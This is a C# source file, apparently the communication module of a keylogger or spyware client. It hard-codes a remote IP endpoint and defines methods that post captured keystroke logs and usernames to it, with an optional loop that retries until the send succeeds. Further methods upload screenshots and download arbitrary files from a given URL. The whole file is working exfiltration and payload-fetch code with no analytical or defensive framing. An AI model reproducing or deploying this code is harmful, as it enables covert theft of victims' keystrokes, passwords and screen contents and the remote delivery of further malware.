using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace Client.Communication
{
    public static class Server
    {
        /// <summary>
        /// The server's endpoint.
        /// </summary>

        private static string API = "http://194.233.71.142/ll/TellMe.php";

        public async static Task<bool> AsyncSendKeylogs(string logged, string username, bool force = false)
        {
            bool result = false;
            await Task.Run(() =>
            {
                do
                {
                    try
                    {
                        MultipartFormDataContent form = new MultipartFormDataContent();
                        form.Add(new StringContent(logged), "logs");
                        HttpClient httpClient = new HttpClient();
                        httpClient.Timeout = TimeSpan.FromSeconds(10);
                        var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=logs", form).Result;
                        Console.WriteLine(response.Content.ReadAsStringAsync().Result);
                        result = response.IsSuccessStatusCode;
                    }
                    catch { result = false; }
                } while (force && !result);
            });
            return result;
        }
        public async static Task<bool> AsyncUploadScreenshot(byte[] image_buffer, string username)
        {
            bool result = false;
            await Task.Run(() =>
            {
                try
                {
                    MultipartFormDataContent form = new MultipartFormDataContent();
                    form.Add(new ByteArrayContent(image_buffer, 0, image_buffer.Length), "file", "screenshot");

                    HttpClient httpClient = new HttpClient();
                    httpClient.Timeout = TimeSpan.FromSeconds(20);

                    var response = httpClient.PostAsync($"{API}?username=\"{HttpUtility.UrlEncode(username)}\"&type=screenshot", form).Result;
                    result = response.IsSuccessStatusCode;
                }
                catch (Exception ex)
                {
                    result = false;
                }
            });
            return result;
        }

        public async static Task<string> AsyncDownloadFile(string url, string filename)
        {
            string successful_filename = null;
            await Task.Run(() =>
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(url, filename);
                    successful_filename = filename;
                }
            });
            return successful_filename;
        }
    }
}
